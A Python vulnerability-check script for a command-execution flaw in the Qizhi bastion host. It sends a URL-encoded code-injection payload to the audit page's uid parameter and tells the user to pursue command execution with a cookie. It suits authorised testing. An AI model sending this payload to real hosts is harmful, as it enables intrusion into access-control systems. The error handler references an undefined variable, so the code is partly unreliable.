import requests
import sys
import warnings

banner="""
 ______   _ _   _ _             
|  ____| (_) \ | (_)            
| |__ ___ _|  \| |_  __ _  ___  
|  __/ _ \ | . ` | |/ _` |/ _ \ 
| | |  __/ | |\  | | (_| | (_) |
|_|  \___|_|_| \_|_|\__,_|\___/ 
                version:1.7
                
Qizhi-堡垒机后台命令执行漏洞检测脚本
                
"""

warnings.filterwarnings("ignore")

print(banner)

ip = sys.argv[2]
header = {
"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
}
payload = "/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm"

urls = ip + payload

try:
    r = requests.get(url=urls,headers=header,verify=False,timeout=10)
    if "重新登录系统" not in r.text and r.status_code == 200:
        print("\033[0;32;40m[+] {} 疑似存在Qizhi-堡垒机后台命令执行漏洞！！！\033[0m".format(ip))
        print("\033[0;32;40m请利用cookie进一步进行后台命令执行漏洞测试！！\033[0m")
    else:
        print("\033[0;31;40m[-] {} 未发现Qizhi-堡垒机后台命令执行漏洞\033[0m".format(ip))
except Exception as e:
    print("[x] {} 请求失败 ".format(url))
    
    
 